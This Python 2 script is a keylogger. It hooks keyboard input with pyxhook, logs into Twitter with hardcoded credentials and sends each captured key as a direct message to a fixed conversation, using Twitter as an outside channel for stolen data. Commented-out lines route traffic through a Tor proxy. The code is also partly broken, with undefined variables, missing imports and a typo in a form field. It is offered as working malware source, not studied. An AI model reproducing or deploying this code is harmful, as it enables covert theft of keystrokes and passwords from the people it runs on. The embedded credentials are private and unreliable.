# -*- coding: utf-8 -*-
# send_keylog
from bs4 import BeautifulSoup
from requests.exceptions import ConnectionError
import requests
import pyxhook

SESSION = requests.Session()
RESPONSE = ""
AUTH_TOKEN = ""
USERNAME = "ShuntoMizushima"
PASSWORD = "mizushima4105"

class KeyLogSender:
    def __init__(self):
        ip = 'localhost'
        port = 9050
        #socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, ip, port)
        #socket.socket = socks.socksocket
        self.host_url = "https://twitter.com/"
        self.session_url = self.host_url + "sessions"
        self.dm_url = self.host_url + "i/direct_messages/new"
    
    def login(self):
        global SESSION, RESPONSE, AUTH_TOKEN

        headers = {
            "User-Agent": "Mozilla/5.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "ja,en-US;q=0.7,en;q=0.3",
            "Content-Type": "application/x-www-form-urlencoded",
            "Referer": "https://twitter.com/",
            "Origin": "https://twitter.com",
            "Upgrade-insecure-requests": "1"
        }
                                                                                                                       
        login = {
            "session[username_or_email]": "",
            "sesssion[password]": "",
            "remember_me": "1",
            "return_to_ssl": "",
            "redirect_after_login": "/",
            "scribe_log": "",
            "authenticity_token":""
        }
        
        try: 
            response = SESSION.get(self.host_url, headers=headers, allow_redirects=False)
            soup = BeautifulSoup(response.text, "lxml")
            AUTH_TOKEN = soup.find(attrs={'name': 'authenticity_token'}).get('value')
        except ConnectionError:
            print "[*] Can't connect to Twitter."
            sys.exit()
                                                                                                                       
        login['authenticity_token'] = AUTH_TOKEN
                                                                                                                       
        try:
            login = SESSION.post(session_url, headers=headers, data=payload, allow_redirects=False)
            if login.status_code == 302 or login.status_code == 200:
                print "[+] Loggined successfully, HTTP Status Code: %d" % login.status_code
            else:
                print "[+] Failed to loggin, HTTP Status Code: %d" % login.status_code
            
        except:
            "[+] An error occurred in the middle of the login."

    def dm_send(self, message):
        global SESSION, RESPONSE, AUTH_TOKEN

        headers = {
            "User-Agent":"Mozilla/5.0",
            "referer":"https://twitter.com/"
        }

        send = {
            "authenticity_token":AUTH_TOKEN,
            "conversation_id":"796359178117750785-796359178117750785",
            "scribeContect[component]":"tweet_box_dm",
            "tagged_users":"",
            "text":message,
            "tweetboxId":"swift_tweetbox_1501901524731"
        } 

        try:
            RESPONSE = SESSION.post(self.dm_url, data=send, allow_redirects=False, headers=headers, cookies=RESPONSE.cookies)

            if RESPONSE.status_code == 200:
                print "[+] Completed sending the message, HTTP Status code: %d" % RESPONSE.status_code
            else:
                print "[+] Failed to send the message, HTTP Status code: %d" % RESPONSE.status_code
        except:
            print "[+] An error occurred while sending the message."

def OnKeyPress(event):
    try:
        KeyLogSender.dm_send(event.Key)
    except:
        print "[+] An error occurred while sending the key information."

if __name__ == "__main__":
    KeyLogSender = KeyLogSender()
    KeyLogSender.login()
    
    new_hook = pyxhook.HookManager()
    new_hook.KeyDown = OnKeyPress    
    new_hook.HookKeyboard()
    new_hook.start()
